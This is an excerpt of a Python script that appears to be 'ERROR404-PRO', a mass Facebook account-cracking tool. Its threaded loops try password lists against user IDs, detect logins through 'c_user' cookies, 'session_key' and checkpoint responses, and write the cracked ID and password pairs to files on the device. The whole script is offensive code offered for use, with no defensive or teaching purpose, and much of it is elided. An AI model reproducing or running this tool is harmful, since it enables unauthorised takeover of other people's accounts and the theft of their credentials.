...
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
    ...
    │ [✓] VERSION  : 0.0.1                  │
    │ [✓] TOOL NAME : \033[1;32mERROR404-PRO \033[1;37m         │
    └───────────────────────────────────────┘""")
...
def Spy():
	clear()
	#ckx()
	print(f" [1] FILE CLONE (SYSTEM API) ")
	...
	if me in ["1", "01","11","A","a"]:
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f"\033[1;37m USE FLIGHT MODE FOR SPEED UP \033[1;36m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m ERROR-XD %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [ERROR-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/ERROR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [ERROR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ERROR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [ERROR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/ERROR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        print(f'\033[1;32m RANDOM COLNING STARTED ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m WAIT & SEE 🔥\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[ERROR-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[ERROR-CP] '+idf+' | '+ps+'\033[0;97m')
